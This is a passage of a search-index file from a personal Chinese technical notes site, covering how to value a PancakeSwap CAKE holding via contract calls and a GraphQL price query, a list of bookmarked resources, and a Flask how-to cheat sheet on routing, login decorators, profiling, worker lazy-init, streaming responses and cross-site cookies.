\u7b2c\u4e00\u4e2a\u95ee\u9898\u597d\u89e3\u51b3\uff0c\u6309\u7167\u4e0a\u9762\u8c03\u7528\u5408\u7ea6\u5373\u53ef\uff0c\u5408\u7ea6\u8c03\u7528\u9700\u8981\u4e24\u4e2a\u53c2\u6570\uff0c\u5373\u4f7f\u4e0d\u77e5\u9053\u51fd\u6570\u9009\u62e9\u5668\u548c\u51fd\u6570\u53c2\u6570\u600e\u4e48\u5199\uff0c\u4e5f\u53ef\u4ee5\u8ba9etherscan\u6765\u5e2e\u6211\u4eec\u8c03\u7528 \u5408\u7ea6 \u770b\u6d41\u91cf\u5373\u53ef WEB3_ENDPOINT='https://bsc-dataseed.binance.org/' callfunction(contract_address, \"pendingCake(uint256,address)\", \"0\"*64+addrtoarg(my_address), \"latest\", usecache=False)/10**18 \u7b2c\u4e8c\u4e2a\u95ee\u9898\uff1a\u83b7\u53d6CAKE\u7684\u4ef7\u503c \u53ef\u4ee5\u5728 pancakeswap.info\u7684token\u9875\u9762 \u770b\u5230 \u5f53\u524dCAKE\u7684\u4ef7\u503c\u663e\u793a\u4e3a$0.64 \u901a\u8fc7\u4ed4\u7ec6\u7ffb\u6d41\u91cf+F12\u770b\u524d\u7aefjs+\u5b66GraphQL\u7684\u5199\u6cd5\uff0c\u53d1\u73b0\u8fd9\u4e2a\u56fe\u67e5\u8be2\u53ef\u4ee5\u4e00\u6b21\u8fd4\u56de\u4e24\u4e2a\u5185\u5bb9\uff1a https://api.bscgraph.org/subgraphs/name/wowswap/graphql { tokens(where: {id: \"0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82\"}) { id name symbol derivedETH tradeVolume tradeVolumeUSD untrackedVolumeUSD totalLiquidity txCount __typename } bundles(where: {id: 1}) { id ethPrice __typename } } \u67e5\u8be2\u5230\uff1a { \"data\": { \"bundles\": [ { \"__typename\": \"Bundle\", \"ethPrice\": \"40.4164616943543110107673755202366\", \"id\": \"1\" } ], \"tokens\": [ { \"__typename\": \"Token\", \"derivedETH\": \"0.01577253120396104706816941010842497\", \"id\": \"0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82\", \"name\": \"PancakeSwap Token\", \"symbol\": \"Cake\", \"totalLiquidity\": \"17457173.064252540875767782\", \"tradeVolume\": \"529331425.317628506590140745\", \"tradeVolumeUSD\": \"270335080.4687124727090581348114777\", \"txCount\": \"659265\", \"untrackedVolumeUSD\": \"331587403.3835248774831009549837749\" } ] } } \u5c06\u5176\u4e2d\u7684 ethPrice (\u5b9e\u9645\u4e0a\u662fBNB\u7684\u4ef7\u683c)\u548c derivedETH \u4e58\u8d77\u6765\u5c31\u662f\u6211\u4eec\u9700\u8981\u7684\u4ef7\u683c\u4e86\uff0c\u7b97\u51fa\u6765\u662f $0.6375 \u901a\u7528\u4e00\u70b9\u8fd8\u9700\u8981\u8c03\u7528\u5408\u7ea6 userInfo(uint256,address) \u67e5\u8be2\u81ea\u5df1\u7684\u6301\u4ed3\uff0c\u6700\u540e\u5408\u5728\u4e00\u8d77\uff1a (\u81ea\u5df1\u7684\u6301\u4ed3+pendingpendingCake)*derivedETH*ethPrice","title":"\u5b9e\u4f8b\uff1a\u83b7\u53d6Cake\u6301\u4ed3\u4ef7\u503c"},{"location":"Favorites/","text":"Favorites \u6536\u85cf \u00b6 \u6536\u85cf\u4e00\u4e9b\u6709\u7528\u7684\u8d44\u6599\u54af~ Intel i386 \u624b\u518c i386 \u624b\u518c\u52d8\u8bef \u5b57\u7b26\u7b7e\u540d\u751f\u6210 \u4f8b\u5982lean\u5b57\u4f53\uff1a _/_/ _/_/ _/_/ _/ _/ _/ _/ _/ _/ _/_/_/_/ _/_/_/_/ _/_/_/_/ _/ _/ _/ _/ _/ _/ _/ _/ _/ _/ _/ _/ \u89e3\u91caShell\u547d\u4ee4\u6bcf\u4e2a\u53c2\u6570 \u5b89\u5168\u4f1a\u8bae\u7684\u6392\u540d \u5efa\u8bae\u8bfb\u7684\u8bba\u6587 Git Emoji Math \u8bc6\u522b\u624b\u5199\u516c\u5f0f \u753b\u51fd\u6570\u56fe\u50cf \u5b89\u5168\u6587\u6458 \u6bcf\u5929\u770b\u770b \u7f51\u7ad9\u914d\u8272","title":"Favorites"},{"location":"Favorites/#favorites","text":"\u6536\u85cf\u4e00\u4e9b\u6709\u7528\u7684\u8d44\u6599\u54af~ Intel i386 \u624b\u518c i386 \u624b\u518c\u52d8\u8bef \u5b57\u7b26\u7b7e\u540d\u751f\u6210 \u4f8b\u5982lean\u5b57\u4f53\uff1a _/_/ _/_/ _/_/ _/ _/ _/ _/ _/ _/ _/_/_/_/ _/_/_/_/ _/_/_/_/ _/ _/ _/ _/ _/ _/ _/ _/ _/ _/ _/ _/ \u89e3\u91caShell\u547d\u4ee4\u6bcf\u4e2a\u53c2\u6570 \u5b89\u5168\u4f1a\u8bae\u7684\u6392\u540d \u5efa\u8bae\u8bfb\u7684\u8bba\u6587 Git Emoji Math \u8bc6\u522b\u624b\u5199\u516c\u5f0f \u753b\u51fd\u6570\u56fe\u50cf \u5b89\u5168\u6587\u6458 \u6bcf\u5929\u770b\u770b \u7f51\u7ad9\u914d\u8272","title":"Favorites \u6536\u85cf"},{"location":"Flask/","text":"Flask \u5907\u5fd8 \u00b6 \u5e38\u7528\u7684\u4e00\u4e9b\u64cd\u4f5c\uff0c\u81ea\u5df1\u603b\u7ed3\u7684\uff0c\u4fbf\u4e8e\u67e5\u9605 \u5e94\u7528\u6839\u76ee\u5f55APP_ROOT \u00b6 APP_ROOT = os.path.dirname(os.path.abspath(__file__)) app.route\u91cc\u7684int\u548cPOST \u00b6 @app . route ( \"/list/<int:boardid>\" ) @app . route ( \"/receive_post\" , methods =[ \"POST\" ] ) post_param = int ( request . form . get ( \"post_param\" , \"0\" )) # get\u53c2\u6570\u7528request . args render_template\u5f15\u5165\u6240\u6709\u5168\u5c40\u53d8\u91cf+\u5c40\u90e8\u53d8\u91cf \u00b6 str = str len = len int = int @app . route ( \"/\" ) def index () : # ... some logic code targs = globals () targs . update ( locals ()) return render_template ( \"template.html\" , ** targs ) \u6dfb\u52a0\u591a\u4e2a\u9759\u6001\u76ee\u5f55 \u00b6 from flask import Flask , render_template , Blueprint , request , redirect app = Flask ( __name__ ) for path in [ 'images' , 'pic' , 'css' ]: blueprint = Blueprint ( path , __name__ , static_url_path = '/' + path , static_folder = path ) app . register_blueprint ( blueprint ) \u5224\u65ad\u662f\u5426\u624b\u673a\u8bbf\u95ee g.isphone \u00b6 @app.before_request def before_request(): ua = request.user_agent.string.lower() for mobileua in \"android|fennec|iemobile|iphone|opera mini|opera mobi|mobile\".split(\"|\"): if mobileua in ua: g.isphone = True break else: g.isphone = False \u9650\u5236\u7279\u5b9aget\u6574\u6570\u53c2\u6570\u7684\u53d6\u503c \u00b6 def limit_param(param_name, default_value, minvalue, maxvalue): \"\"\" example: p = limit_param(\"p\", 1, 1, 5) \"\"\" if maxvalue<minvalue: maxvalue = minvalue try: data = int(request.args.get(param_name, default_value)) except: data = default_value if data<minvalue: data = minvalue elif data > maxvalue: data = maxvalue return data \u8981\u6c42\u767b\u5f55\u7684decorator \u00b6 \u7528\u6cd5: @require_login() \u6ce8\u610f\u4f7f\u7528\u65f6\u6dfb\u52a0\u5230 @app.route \u884c\u7684\u540e\u9762 import functools from flask import session , abort , redirect def require_login ( code = 200 , text = \"login first\" , jumptologin = False ): def real_decorator ( func ): @functools.wraps ( func ) def wrapper ( * args , ** kwargs ): if \"username\" not in session : if jumptologin : return redirect ( \"/signin?error=needlogin&next=\" + signit ( request . path )) elif code == 200 : return text else : abort ( code ) else : return func ( * args , ** kwargs ) return wrapper return real_decorator import\u5f15\u5165\u5217\u8868 \u00b6 from flask import Flask , render_template , Blueprint , request , redirect , Markup , g , session , abort , Response , make_response , send_file , jsonify from werkzeug.utils import secure_filename import time import datetime import random import pickle import requests import os import sys import traceback import mimetypes import string import re import hashlib import json request\u600e\u4e48\u62ff\u5230url\u7684\u5404\u4e2a\u90e8\u5206 \u00b6 \u6765\u81eahttps://stackoverflow.com/questions/15974730/how-do-i-get-the-different-parts-of-a-flask-requests-url request: curl -XGET http://127.0.0.1:5000/alert/dingding/test?x=y then: request . method : GET request . url : http : // 127 . 0 . 0 . 1 : 5000 / alert / dingding / test ? x = y request . base_url : http : // 127 . 0 . 0 . 1 : 5000 / alert / dingding / test request . url_charset : utf - 8 request . url_root : http : // 127 . 0 . 0 . 1 : 5000 / str ( request . url_rule ): / alert / dingding / test request . host_url : http : // 127 . 0 . 0 . 1 : 5000 / request . host : 127 . 0 . 0 . 1 : 5000 request . script_root : request . path : / alert / dingding / test request . full_path : / alert / dingding / test ? x = y request . args : ImmutableMultiDict ([( 'x' , 'y' )]) request . args . get ( 'x' ): y request\u5176\u4ed6\u7684\u90e8\u5206 \u00b6 request.get_data() POST\u5185\u5bb9 bytes\u7c7b\u578b request.endpoint \u5904\u7406\u8fd9\u4e2a\u8bf7\u6c42\u7684\u51fd\u6570\u540d\u79f0 \u9047\u5230\u6027\u80fd\u74f6\u9888\u505aprofiling\u770b\u51fd\u6570\u8017\u65f6 \u00b6 \u627e\u5230\u5bf9uwsgi\u5e94\u7528\u505aprofiling\u7684 dozer \u5e93 \u4f7f\u7528\u65b9\u6cd5\uff1a \u5148\u5b89\u88c5python3\u5bf9\u5e94\u7684uwsgi\uff1a apt install uwsgi-plugin-python3 \u5199\u4e00\u4e2apython\u811a\u672c\u5305\u88c5app\uff0c\u5982 profiler_app.py \uff1a 1 2 3 4 5 6 7 8 #!/usr/bin/python3 from app import app from dozer import Profiler appx = Profiler ( app , profile_path = \"/tmp/profiles\" ) if __name__ == \"__main__\" : import os os . system ( \"uwsgi -w profiler_app:appx --http :80\" ) \u522b\u5fd8\u8bb0 mkdir /tmp/profiles \u7136\u540e\u5c31\u53ef\u4ee5\u542f\u52a8\u4e86 python3 profiler_app.py \u4f7f\u7528http://127.0.0.1/_profiler/ \u67e5\u770b\u7ed3\u679c\uff0c\u53ef\u4ee5\u70b9\u5f00\u6bcf\u4e2a\u8bf7\u6c42\u770b\u5404\u4e2a\u51fd\u6570\u8017\u65f6\u8be6\u60c5 lazyload \u5ef6\u8fdf\u52a0\u8f7d\u8017\u65f6\u7684\u521d\u59cb\u5316\u64cd\u4f5c \u00b6 \u9700\u6c42\uff1a\u7279\u5b9a\u9875\u9762\u9700\u8981\u52a0\u8f7d\u4e00\u4e9b\u8017\u65f6\u7684\u8d44\u6e90\uff0c\u5982\u679c\u5728\u5e94\u7528\u542f\u52a8\u7684\u65f6\u5019\u505a\u52a0\u8f7d\uff0c\u6b64\u65f6\u65b0\u6765\u7684\u8bf7\u6c42\u5c31\u5fc5\u987b\u7b49\u5f85\u8fd9\u4e2a\u52a0\u8f7d\u624d\u80fd\u5b8c\u6210\uff1b\u800c\u5b9e\u9645\u4e0a\u8fd9\u4e2ainit\u5e76\u975e\u6240\u6709\u8bf7\u6c42\u90fd\u5fc5\u987b\u7684\uff0c\u60f3\u505a\u4e00\u4e2alazyinit: \u5728\u4e0d\u5f71\u54cd\u6b63\u5e38\u8bf7\u6c42\u7684\u524d\u63d0\u4e0b\u5c3d\u5feb\u5b8c\u6210init\u51fd\u6570 \u6211\u7684\u505a\u6cd5\uff1a\u8bbe\u8ba1\u4e00\u4e2a /lazyinit \u8def\u7531\u51fd\u6570\u505a\u521d\u59cb\u5316\u5de5\u4f5c\uff0c\u5728\u91cd\u65b0\u90e8\u7f72/\u91cd\u542fflask\u670d\u52a1\u7684\u65f6\u5019\u540c\u65f6\u542f\u52a8\u4e00\u4e2a\u7b80\u5355\u7684python\u811a\u672c\u53cd\u590d\u8bf7\u6c42\u8fd9\u4e2aurl\u76f4\u5230\u6240\u6709\u7684\u8fdb\u7a0b\u90fd\u5df2\u7ecf\u89e6\u53d1 \u8fd9\u6837\u5229\u7528uwsgi\u81ea\u8eab\u5c31\u6709\u7684\u591a\u8fdb\u7a0b\u8d1f\u8f7d\u5747\u8861\uff0c\u6bcf\u6b21\u6700\u591a\u53ea\u4f1a\u6709\u4e00\u4e2a\u8fdb\u7a0b\u505a\u521d\u59cb\u5316\u5de5\u4f5c\uff0c\u5176\u4ed6\u8fdb\u7a0b\u53ef\u4ee5\u6b63\u5e38\u5904\u7406\u8bf7\u6c42\uff1b\u574f\u5904\u5c31\u662f\u5728\u65e5\u5fd7\u91cc\u9762\u4ea7\u751f\u4e00\u4e9b\u5783\u573e\u5427\uff0c\u5f71\u54cd\u4e0d\u5927 \u95ee\u9898\u6765\u4e86 uwsgi\u600e\u4e48\u77e5\u9053\u5f53\u524d\u662f\u54ea\u4e2a\u8fdb\u7a0b\u5462 \u6211\u53d1\u73b0threading\u63d0\u4f9b\u7684\u8fdb\u7a0b\u540d\u79f0\u662f\u5b57\u7b26\u4e32 b'uWSGIWorker2Core2' \uff0c\u5176\u4e2d Worker \u540e\u9762\u7684\u6570\u5b57\u5c31\u662f\u8fdb\u7a0bID \u4e0d\u540c\u8fdb\u7a0bID\u7684\u5168\u5c40\u53d8\u91cf\u662f\u4e0d\u540c\u7684 \u4ee3\u7801\uff1a flask\u4e2d\u7684 /lazyinit \u5b9e\u73b0\uff0c\u8fd4\u56de\u5904\u7406\u5f53\u524d\u8bf7\u6c42\u7684worker id\uff1a import threading def get_workerid (): # return uwsgi worker id: int threadname = threading . current_thread () . name id_str = threadname . lower () . split ( \"worker\" )[ 1 ] . split ( \"core\" )[ 0 ] return int ( id_str ) HAS_INITED = False @app.route ( \"/lazyinit\" ) def lazyinit (): workerid = get_workerid () if not HAS_INITED : # skip init if has already initialized sleep ( 1 ) # do real init code... HAS_INITED = True return str ( workerid ) \u8fd9\u662f\u53cd\u590d\u8bf7\u6c42\u7684\u4ee3\u7801\uff0c\u91cd\u590d\u8bf7\u6c42\u6700\u591a100\u6b21\uff0c\u76f4\u5230\u6240\u67094\u4e2a\u8fdb\u7a0b\u90fd\u5df2\u7ecf\u89e6\u53d1\uff0c\u5176\u4e2duwsgi\u7684workerid\u662f\u4ece1\u5f00\u59cb\u8ba1\u6570\u7684 MAX_TRIES = 100 PROCESS_COUNT = 4 import requests i = 0 status = [ False ] * PROCESS_COUNT for i in range ( MAX_TRIES ): id = requests . get ( \"http://127.0.0.1/lazyinit?id=\" + str ( i )) . text id = int ( id ) - 1 status [ id ] = True if all ( status ): break \u8ba9app.run\u542f\u52a8\u7684\u670d\u52a1\u5668\u4f7f\u7528HTTP/1.1 \u00b6 \u5c31\u662f\u8fd9\u4e2a\u95ee\u9898\uff1a https://www.reddit.com/r/flask/comments/634i5u/make_flask_return_header_response_with_http11/ \u4eba\u5bb6\u8ba4\u4e3aFlask\u4e0d\u652f\u6301\uff0c\u5176\u5b9eflask\u4f7f\u7528\u7684\u662f werkzeug.serving \uff0c\u6700\u5e95\u5c42\u8fd8\u662fBaseHTTPRequestHandler\uff0c\u800c\u8fd9\u4e2a\u662f\u652f\u6301HTTP/1.1\u7684\uff0c\u53ea\u662f\u9ed8\u8ba4HTTP/1.0\u800c\u5df2 \u5b9e\u9645\u53d1\u9001\u8bf7\u6c42 HTTP/1.1 200 OK \u662f\u8fd9\u4e2a\u7c7b\u7684 send_response \u51fd\u6570\uff0c\u7528\u5230 protocol_version \u8fd9\u4e2a\u5c5e\u6027\uff0c\u800c\u8fd9\u4e2a\u5c5e\u6027\u662f\u7c7b\u7684\u5c5e\u6027\uff08\u4e0d\u662f\u5728 __init__ \u51fd\u6570\u8d4b\u503c\u7684\uff09\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539 \u4e4b\u540e\u521b\u5efa\u7684\u5bf9\u8c61\u5c31\u4f1a\u81ea\u52a8\u62e5\u6709\u65b0\u7684\u503c \u5728\u8c03\u7528\u4e4b\u524d\u6dfb\u52a0\u4ee5\u4e0b\u51e0\u884c\u5373\u53ef try : from http.server import BaseHTTPRequestHandler except : #PY2 from BaseHTTPServer import BaseHTTPRequestHandler BaseHTTPRequestHandler . protocol_version = \"HTTP/1.1\" \u8ba9render_template\u76f4\u63a5\u80fd\u4f7f\u7528\u5f53\u524d\u6240\u6709\u53d8\u91cf \u00b6 \u4e00\u79cd\u76f4\u63a5\u7684\u505a\u6cd5\uff1a\u6ce8\u610f\u987a\u5e8f \u5c40\u90e8\u53d8\u91cf\u4f18\u5148\u4e8e\u5168\u5c40\u53d8\u91cf targs = globals() targs.update(locals()) render_template(\"x.html\", **targs) \u7136\u800c\u8fd9\u6837\u9700\u8981\u6bcf\u4e2a\u89c6\u56fe\u51fd\u6570\u90fd\u5199\u8fd9\u4e09\u884c\uff0c\u4e0d\u591f\u4f18\u96c5 \u4e0d\u5982\u8bd5\u8bd5\uff1a\u83b7\u53d6\u8c03\u7528\u8005\u7684\u5c40\u90e8\u53d8\u91cf https://stackoverflow.com/questions/6618795/get-locals-from-calling-namespace-in-python import inspect def myrender_template ( filename ): backframe = inspect . currentframe () . f_back targs = {} targs . update ( backframe . f_globals ) targs . update ( backframe . f_locals ) return render_template ( filename , ** targs ) \u5728Flask\u4e2d\u6b63\u786e\u5730\u4ea7\u751f\u6d41\u5f0f\u54cd\u5e94EventSource \u00b6 \u8003\u8651\u6211\u4eec\u9700\u8981\u5411\u524d\u7aef\u63d0\u4f9b\u6d88\u606f\u961f\u5217\u7684\u6d88\u8d39\u8005\uff0c\u6bd4\u5982\u6536\u5230\u5e7f\u64ad\u540e\u53d1\u7ed9\u6d4f\u89c8\u5668\u901a\u77e5\u7528\u6237\u3002\u5f53\u7136\u6211\u4eec\u53ef\u4ee5\u7528websocket\uff0c\u4f46\u8fd9\u79cd\u573a\u666f\uff08\u53ea\u6709\u670d\u52a1\u5668\u7ed9\u6d4f\u89c8\u5668\u53d1\uff09\u4e0b\u53ea\u9700\u8981\u957f\u8fde\u63a5\u7684EventSource\u5c31\u884c\u4e86\u3002 \u57fa\u7840\u7bc7\uff1a https://stackoverflow.com/questions/12232304/how-to-implement-server-push-in-flask-framework def queue_consumer () : conn = \u521b\u5efa\u8fde\u63a5 () #\u8fde\u63a5\u5230\u6d88\u606f\u961f\u5217 \uff0c \u521b\u5efa channel for data in conn . \u8bfb\u53d6\u6570\u636e () : yield b \"data: \" + data + b \"\\n\\n\" \u5173\u95ed\u8fde\u63a5 () # \u600e\u4e48\u6267\u884c\u5230 \uff1f @app . route ( \"/stream\" ) def stream () : return Response ( queue_consumer (), mimetype = \"text/event-stream\" ) \u8fd9\u4e2a\u7684\u95ee\u9898\u5728\u4e8e\u5173\u95ed\u8fde\u63a5\u4e0d\u4f1a\u6267\u884c\u5230\uff0c\u5728\u6d88\u606f\u961f\u5217\u670d\u52a1\u5668\u4e0a\u89c2\u5bdf\u5230channel\u4e00\u76f4\u6ca1\u6709\u91ca\u653e\uff0c\u8fd9\u80af\u5b9a\u4e0d\u884c\uff0c\u6211\u4eec\u9700\u8981\u5728\u6d4f\u89c8\u5668\u65ad\u5f00\u8fde\u63a5\u7684\u65f6\u5019\u81ea\u52a8\u91ca\u653econn\u7b49\u8d44\u6e90\u3002 \u8bfb\u4e86 werkzeug \u7684\u6e90\u4ee3\u7801\u53d1\u73b0 Response \u6709 call_on_close \u51fd\u6570\uff0c\u5728\u8fde\u63a5\u5173\u95ed\u7684\u65f6\u5019\u6211\u4eec\u628a\u751f\u6210\u5668close\u5373\u53ef\u89e6\u53d1yield\u7684\u5f02\u5e38\uff1a def queue_consumer () : conn = \u521b\u5efa\u8fde\u63a5 () #\u8fde\u63a5\u5230\u6d88\u606f\u961f\u5217 \uff0c \u521b\u5efa channel try : for data in conn . \u8bfb\u53d6\u6570\u636e () : yield b \"data: \" + data + b \"\\n\\n\" #\u7ed3\u675f\u7684\u65f6\u5019\u4f1a\u89e6\u53d1GeneratorExit\u5f02\u5e38 except : pass \u5173\u95ed\u8fde\u63a5 () @app . route ( \"/stream\" ) def stream () : consumer = queue_consumer () res = Response ( consumer , mimetype = \"text/event-stream\" ) def onclose () : consumer . close () res . call_on_close ( onclose ) return res \u8fd9\u6837\u8fd8\u4e0d\u591f\uff0c\u53d1\u73b0\u65e0\u6cd5\u4f7f\u7528g\uff0c\u4ee5\u53caNginx\u9ed8\u8ba4\u7f13\u5b58\u54cd\u5e94\u5bfc\u81f4\u5ef6\u8fdf\uff0c\u9700\u8981\u7ee7\u7eed\u914d\u7f6e\uff1a def queue_consumer () : conn = \u521b\u5efa\u8fde\u63a5 () #\u8fde\u63a5\u5230\u6d88\u606f\u961f\u5217 \uff0c \u521b\u5efa channel try : for data in conn . \u8bfb\u53d6\u6570\u636e () : yield b \"data: \" + data + b \"\\n\\n\" #\u7ed3\u675f\u7684\u65f6\u5019\u4f1a\u89e6\u53d1GeneratorExit\u5f02\u5e38 except : pass \u5173\u95ed\u8fde\u63a5 () @app . route ( \"/stream\" ) def stream () : consumer = queue_consumer () res = Response ( stream_with_context ( consumer ), mimetype = \"text/event-stream\" ) def onclose () : consumer . close () res . call_on_close ( onclose ) res . headers [ \"X-Accel-Buffering\" ] = \"no\" res . headers [ \"Cache-Control\" ] = \"no-cache\" return res \u8fd9\u4e9bNginx\u914d\u7f6e\u4f60\u4e5f\u53ef\u80fd\u9700\u8981\u52a0\u4e0a\uff1a\u5c24\u5176\u662f\u8fd8\u6709\u4e0b\u4e00\u5c42\u53cd\u4ee3\u7684\u65f6\u5019 uwsgi_pass_header \"X-Accel-Buffering\" ; uwsgi_read_timeout 120 s ; uwsgi_send_timeout 120 s ; proxy_http_version 1 . 1 ; proxy_set_header Connection \"\" ; proxy_pass_header \"X-Accel-Buffering\" ; Flask\u8de8\u57dfCookie \u00b6 \u5f53\u6211\u4eec\u7684\u7f51\u7ad9\u80fd\u88ab\u8de8\u57df\u8bbf\u95ee\u7684\u65f6\u5019\uff0c\u8981\u6ce8\u610fcookie\u7684\u8bbe\u7f6e\uff0c\u52a0\u4e0a SameSite=None; Secure \u53c2\u8003: https://stackoverflow.com/questions/56828663/how-to-explicitly-set-samesite-none-on-a-flask-response https://github.com/pallets/werkzeug/issues/1549 https://stackoverflow.com/questions/62992831/python-session-samesite-none-not-being-set resp.set_cookie('cross-site-cookie', 'bar', samesite='None', secure=True) resp.headers.add('Set-Cookie','cross-site-cookie=bar; SameSite=None; Secure') Flask\u7684session cookie\u4e5f\u8981\u8de8\u57df\u7684\u8bdd\uff1a from flask import session from flask.sessions import SecureCookieSessionInterface session_cookie = SecureCookieSessionInterface () . get_signing_serializer ( app ) @app.after_request def cookies ( response ): same_cookie = session_cookie . dumps ( dict ( session )) response . headers . add ( \"Set-Cookie\" , f \"session={same_cookie}; Secure; HttpOnly; SameSite=None; Path=/;\" ) return response","title":"Flask"},{"location":"Flask/#flask","text":"\u5e38\u7528\u7684\u4e00\u4e9b\u64cd\u4f5c\uff0c\u81ea\u5df1\u603b\u7ed3\u7684\uff0c\u4fbf\u4e8e\u67e5\u9605","title":"Flask \u5907\u5fd8"},{"location":"Flask/#app_root","text":"APP_ROOT = os.path.dirname(os.path.abspath(__file__))","title":"\u5e94\u7528\u6839\u76ee\u5f55APP_ROOT"},{"location":"Flask/#approuteintpost","text":"@app . route ( \"/list/<int:boardid>\" ) @app . route ( \"/receive_post\" , methods =[ \"POST\" ] ) post_param = int ( request . form . get ( \"post_param\" , \"0\" )) # get\u53c2\u6570\u7528request . args","title":"app.route\u91cc\u7684int\u548cPOST"},{"location":"Flask/#render_template","text":"str = str len = len int = int @app . route ( \"/\" ) def index () : # ... some logic code targs = globals () targs . update ( locals ()) return render_template ( \"template.html\" , ** targs )","title":"render_template\u5f15\u5165\u6240\u6709\u5168\u5c40\u53d8\u91cf+\u5c40\u90e8\u53d8\u91cf"},{"location":"Flask/#_1","text":"from flask import Flask , render_template , Blueprint , request , redirect app = Flask ( __name__ ) for path in [ 'images' , 'pic' , 'css' ]: blueprint = Blueprint ( path , __name__ , static_url_path = '/' + path , static_folder = path ) app . register_blueprint ( blueprint )","title":"\u6dfb\u52a0\u591a\u4e2a\u9759\u6001\u76ee\u5f55"},{"location":"Flask/#gisphone","text":"@app.before_request def before_request(): ua = request.user_agent.string.lower() for mobileua in \"android|fennec|iemobile|iphone|opera mini|opera mobi|mobile\".split(\"|\"): if mobileua in ua: g.isphone = True break else: g.isphone = False","title":"\u5224\u65ad\u662f\u5426\u624b\u673a\u8bbf\u95ee g.isphone"},{"location":"Flask/#get","text":"def limit_param(param_name, default_value, minvalue, maxvalue): \"\"\" example: p = limit_param(\"p\", 1, 1, 5) \"\"\" if maxvalue<minvalue: maxvalue = minvalue try: data = int(request.args.get(param_name, default_value)) except: data = default_value if data<minvalue: data = minvalue elif data > maxvalue: data = maxvalue return data","title":"\u9650\u5236\u7279\u5b9aget\u6574\u6570\u53c2\u6570\u7684\u53d6\u503c"},{"location":"Flask/#decorator","text":"\u7528\u6cd5: @require_login() \u6ce8\u610f\u4f7f\u7528\u65f6\u6dfb\u52a0\u5230 @app.route \u884c\u7684\u540e\u9762 import functools from flask import session , abort , redirect def require_login ( code = 200 , text = \"login first\" , jumptologin = False ): def real_decorator ( func ): @functools.wraps ( func ) def wrapper ( * args , ** kwargs ): if \"username\" not in session : if jumptologin : return redirect ( \"/signin?error=needlogin&next=\" + signit ( request . path )) elif code == 200 : return text else : abort ( code ) else : return func ( * args , ** kwargs ) return wrapper return real_decorator","title":"\u8981\u6c42\u767b\u5f55\u7684decorator"},{"location":"Flask/#import","text":"from flask import Flask , render_template , Blueprint , request , redirect , Markup , g , session , abort , Response , make_response , send_file , jsonify from werkzeug.utils import secure_filename import time import datetime import random import pickle import requests import os import sys import traceback import mimetypes import string import re import hashlib import json","title":"import\u5f15\u5165\u5217\u8868"},{"location":"Flask/#requesturl","text":"\u6765\u81eahttps://stackoverflow.com/questions/15974730/how-do-i-get-the-different-parts-of-a-flask-requests-url request: curl -XGET http://127.0.0.1:5000/alert/dingding/test?x=y then: request . method : GET request . url : http : // 127 . 0 . 0 . 1 : 5000 / alert / dingding / test ? x = y request . base_url : http : // 127 . 0 . 0 . 1 : 5000 / alert / dingding / test request . url_charset : utf - 8 request . url_root : http : // 127 . 0 . 0 . 1 : 5000 / str ( request . url_rule ): / alert / dingding / test request . host_url : http : // 127 . 0 . 0 . 1 : 5000 / request . host : 127 . 0 . 0 . 1 : 5000 request . script_root : request . path : / alert / dingding / test request . full_path : / alert / dingding / test ? x = y request . args : ImmutableMultiDict ([( 'x' , 'y' )]) request . args . get ( 'x' ): y","title":"request\u600e\u4e48\u62ff\u5230url\u7684\u5404\u4e2a\u90e8\u5206"},{"location":"Flask/#request","text":"request.get_data() POST\u5185\u5bb9 bytes\u7c7b\u578b request.endpoint \u5904\u7406\u8fd9\u4e2a\u8bf7\u6c42\u7684\u51fd\u6570\u540d\u79f0","title":"request\u5176\u4ed6\u7684\u90e8\u5206"},{"location":"Flask/#profiling","text":"\u627e\u5230\u5bf9uwsgi\u5e94\u7528\u505aprofiling\u7684 dozer \u5e93 \u4f7f\u7528\u65b9\u6cd5\uff1a \u5148\u5b89\u88c5python3\u5bf9\u5e94\u7684uwsgi\uff1a apt install uwsgi-plugin-python3 \u5199\u4e00\u4e2apython\u811a\u672c\u5305\u88c5app\uff0c\u5982 profiler_app.py \uff1a 1 2 3 4 5 6 7 8 #!/usr/bin/python3 from app import app from dozer import Profiler appx = Profiler ( app , profile_path = \"/tmp/profiles\" ) if __name__ == \"__main__\" : import os os . system ( \"uwsgi -w profiler_app:appx --http :80\" ) \u522b\u5fd8\u8bb0 mkdir /tmp/profiles \u7136\u540e\u5c31\u53ef\u4ee5\u542f\u52a8\u4e86 python3 profiler_app.py \u4f7f\u7528http://127.0.0.1/_profiler/ \u67e5\u770b\u7ed3\u679c\uff0c\u53ef\u4ee5\u70b9\u5f00\u6bcf\u4e2a\u8bf7\u6c42\u770b\u5404\u4e2a\u51fd\u6570\u8017\u65f6\u8be6\u60c5","title":"\u9047\u5230\u6027\u80fd\u74f6\u9888\u505aprofiling\u770b\u51fd\u6570\u8017\u65f6"},{"location":"Flask/#lazyload","text":"\u9700\u6c42\uff1a\u7279\u5b9a\u9875\u9762\u9700\u8981\u52a0\u8f7d\u4e00\u4e9b\u8017\u65f6\u7684\u8d44\u6e90\uff0c\u5982\u679c\u5728\u5e94\u7528\u542f\u52a8\u7684\u65f6\u5019\u505a\u52a0\u8f7d\uff0c\u6b64\u65f6\u65b0\u6765\u7684\u8bf7\u6c42\u5c31\u5fc5\u987b\u7b49\u5f85\u8fd9\u4e2a\u52a0\u8f7d\u624d\u80fd\u5b8c\u6210\uff1b\u800c\u5b9e\u9645\u4e0a\u8fd9\u4e2ainit\u5e76\u975e\u6240\u6709\u8bf7\u6c42\u90fd\u5fc5\u987b\u7684\uff0c\u60f3\u505a\u4e00\u4e2alazyinit: \u5728\u4e0d\u5f71\u54cd\u6b63\u5e38\u8bf7\u6c42\u7684\u524d\u63d0\u4e0b\u5c3d\u5feb\u5b8c\u6210init\u51fd\u6570 \u6211\u7684\u505a\u6cd5\uff1a\u8bbe\u8ba1\u4e00\u4e2a /lazyinit \u8def\u7531\u51fd\u6570\u505a\u521d\u59cb\u5316\u5de5\u4f5c\uff0c\u5728\u91cd\u65b0\u90e8\u7f72/\u91cd\u542fflask\u670d\u52a1\u7684\u65f6\u5019\u540c\u65f6\u542f\u52a8\u4e00\u4e2a\u7b80\u5355\u7684python\u811a\u672c\u53cd\u590d\u8bf7\u6c42\u8fd9\u4e2aurl\u76f4\u5230\u6240\u6709\u7684\u8fdb\u7a0b\u90fd\u5df2\u7ecf\u89e6\u53d1 